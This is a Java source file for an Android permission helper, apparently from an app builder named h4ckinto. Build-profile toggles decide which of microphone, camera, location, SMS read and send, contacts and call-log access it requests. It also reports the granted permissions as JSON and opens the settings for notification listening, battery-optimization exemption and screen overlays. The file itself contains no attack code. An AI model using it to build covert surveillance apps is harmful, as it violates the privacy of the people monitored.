package com.h4ckinto.android.utils;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.h4ckinto.android.build.BuildProfile;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class PermissionManager {

    /** Runtime permissions to request, based on build-profile.properties. */
    public static String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        if (BuildProfile.PERM_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
                permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
        }
        if (BuildProfile.PERM_CAMERA) permissions.add(Manifest.permission.CAMERA);
        if (BuildProfile.PERM_MICROPHONE) permissions.add(Manifest.permission.RECORD_AUDIO);
        if (BuildProfile.PERM_LOCATION) {
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }
        if (BuildProfile.PERM_SMS) {
            permissions.add(Manifest.permission.READ_SMS);
            permissions.add(Manifest.permission.SEND_SMS);
        }
        if (BuildProfile.PERM_CONTACTS) permissions.add(Manifest.permission.READ_CONTACTS);
        if (BuildProfile.PERM_CALL_LOG) permissions.add(Manifest.permission.READ_CALL_LOG);
        if (BuildProfile.PERM_PHONE_STATE) permissions.add(Manifest.permission.READ_PHONE_STATE);
        if (BuildProfile.PERM_NOTIFICATIONS && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        return permissions.toArray(new String[0]);
    }

    public static final String[] LOCATION_PERMISSIONS = {
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    };

    public static final String[] STORAGE_PERMISSIONS = {
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    public static boolean hasPermission(Context context, String permission) {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasAllPermissions(Context context) {
        for (String permission : getRequiredPermissions()) {
            if (!hasPermission(context, permission)) {
                return false;
            }
        }
        if (BuildProfile.PERM_STORAGE && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return android.os.Environment.isExternalStorageManager();
        }
        return true;
    }

    public static List<String> getMissingPermissions(Context context) {
        List<String> missingPermissions = new ArrayList<>();
        for (String permission : getRequiredPermissions()) {
            if (!hasPermission(context, permission)) {
                missingPermissions.add(permission);
            }
        }
        return missingPermissions;
    }

    public static void requestPermissions(Activity activity, int requestCode) {
        List<String> missingPermissions = getMissingPermissions(activity);
        if (!missingPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(activity, 
                missingPermissions.toArray(new String[0]), requestCode);
        }
    }

    public static boolean hasLocationPermissions(Context context) {
        return hasPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) ||
               hasPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION);
    }

    public static boolean hasStoragePermissions(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // For Android 11+, storage permissions are handled differently
            return true;
        }
        return hasPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) &&
               hasPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE);
    }

    public static boolean hasAudioPermission(Context context) {
        return hasPermission(context, Manifest.permission.RECORD_AUDIO);
    }

    public static boolean hasCameraPermission(Context context) {
        return hasPermission(context, Manifest.permission.CAMERA);
    }

    public static boolean hasSMSPermissions(Context context) {
        return hasPermission(context, Manifest.permission.READ_SMS) &&
               hasPermission(context, Manifest.permission.SEND_SMS);
    }

    public static boolean hasCallLogPermission(Context context) {
        return hasPermission(context, Manifest.permission.READ_CALL_LOG);
    }

    public static boolean hasContactsPermission(Context context) {
        return hasPermission(context, Manifest.permission.READ_CONTACTS);
    }

    public static boolean hasPhoneStatePermission(Context context) {
        return hasPermission(context, Manifest.permission.READ_PHONE_STATE);
    }

    public static boolean hasWifiPermission(Context context) {
        return hasPermission(context, Manifest.permission.ACCESS_WIFI_STATE);
    }

    public static JSONObject getGrantedPermissions(Context context) {
        JSONObject data = new JSONObject();
        try {
            JSONArray perms = new JSONArray();
            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            
            if (pi.requestedPermissions != null) {
                for (int i = 0; i < pi.requestedPermissions.length; i++) {
                    if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) {
                        perms.put(pi.requestedPermissions[i]);
                    }
                }
            }
            data.put("permissions", perms);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return data;
    }

    public static boolean canUsePermission(Context context, String permission) {
        return context.getPackageManager().checkPermission(permission, context.getPackageName()) == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean shouldShowRationale(Activity activity, String permission) {
        return ActivityCompat.shouldShowRequestPermissionRationale(activity, permission);
    }

    public static void openAppSettings(Context context) {
        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(android.net.Uri.fromParts("package", context.getPackageName(), null));
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public static void openNotificationSettings(Context context) {
        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public static void openBatteryOptimizationSettings(Context context) {
        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }

    public static void openSystemAlertWindowSettings(Context context) {
        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
